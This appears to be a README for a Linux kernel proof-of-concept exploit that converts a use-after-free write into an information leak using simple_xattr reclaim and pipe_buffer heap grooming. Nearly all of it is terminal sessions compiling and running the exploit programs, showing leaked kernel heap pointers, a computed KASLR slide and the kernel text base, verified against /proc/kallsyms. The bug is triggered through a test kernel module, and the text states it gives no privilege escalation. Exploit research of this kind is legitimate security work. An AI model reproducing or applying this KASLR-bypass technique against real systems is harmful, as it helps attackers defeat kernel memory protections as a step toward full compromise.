# same_cache_write_leak_xattr

>Same cache UAF write information leak pOc using simple_xattr. No LPE, just info leak. Converting an UAF write into information leak.
For Linux 7.0.

Compile the LKM and then insmod before run the exploit.


<pre>
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ gcc -o leak_heap leak_heap.c
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ ./leak_heap
[*] alloc_total=64 size_off=32 datalen=24
[*] victim freed (dangling). reclaim via setxattr...
[*] UAF write size = 512 (over-read). getxattr...
[*] getxattr returns 512 byte (datalen   24)
[+] heap ptr  @+0x060 = 0xffff8afc4b4df800
[+] heap ptr  @+0x068 = 0xffff8afc4b00c320
[+] heap ptr  @+0x070 = 0xffff8afc4b00c300
[+] heap ptr  @+0x078 = 0xffff8afc4b00c340
[+] heap ptr  @+0x0e0 = 0xffff8afc4b4b6800
[+] heap ptr  @+0x0e8 = 0xffff8afc40947800
[+] heap ptr  @+0x0f0 = 0xffff8afc409477e0
[+] heap ptr  @+0x0f8 = 0xffff8afc40947820
[+] heap leak = 0xffff8afc4b4df800
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ ls
leak.txt  leak_heap  leak_heap.c  leak_text.c
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ gcc -o leak_text leak_text.c
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ ./leak_text
[*] alloc_total=64 size_off=32 datalen=24
[*] pre-groom 400 pipe_buffer (cg-64, ops=.text)
[*] getxattr -> 512 byte
[+] .text ptr @+0x068 = 0xffffffffaa252ec0
[+] .text ptr @+0x0a8 = 0xffffffffaa252ec0
[+] .text ptr @+0x0e8 = 0xffffffffaa252ec0
[+] .text ptr @+0x168 = 0xffffffffaa252ec0
[+] .text ptr @+0x1a8 = 0xffffffffaa252ec0
[+] .text ptr @+0x1e8 = 0xffffffffaa252ec0
[+] .text leak = 0xffffffffaa252ec0
[i] argv[1]=addr of anon_pipe_buf_ops

Let's see : 
┌──(robohax㉿robohax-20bws2ng00)-[/run/…/Desktop/KERNEL/STANDARD/linux-7.0]
└─$ nm vmlinux | grep anon_pipe_buf_ops       
ffffffff82852ec0 d anon_pipe_buf_ops


Test:

robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ ./leak_text 0xffffffff82852ec0
[*] alloc_total=64 size_off=32 datalen=24
[*] pre-groom 400 pipe_buffer (cg-64, ops=.text)
[*] getxattr -> 512 byte
[+] .text ptr @+0x0e8 = 0xffffffffaa252ec0
[+] .text ptr @+0x128 = 0xffffffffaa252ec0
[+] .text ptr @+0x168 = 0xffffffffaa252ec0
[+] .text ptr @+0x1a8 = 0xffffffffaa252ec0
[+] .text ptr @+0x1e8 = 0xffffffffaa252ec0
[+] .text leak = 0xffffffffaa252ec0
[+] KASLR slide  = 0x0000000027a00000
[+] kernel .text base = 0xffffffffa8a00000
robohax@robohax-standardpc:~/Desktop/sheaf_uaf/same_cache_write_leak_xattr/exploit$ 

Verify ?

root@robohax-standardpc:/home/robohax/Desktop/sheaf_uaf/same_cache_write_leak_xattr/lkm# sudo cat /proc/kallsyms | grep "T _text"
ffffffffa8a00000 T _text
root@robohax-standardpc:/home/robohax/Desktop/sheaf_uaf/same_cache_write_leak_xattr/lkm# 

</pre>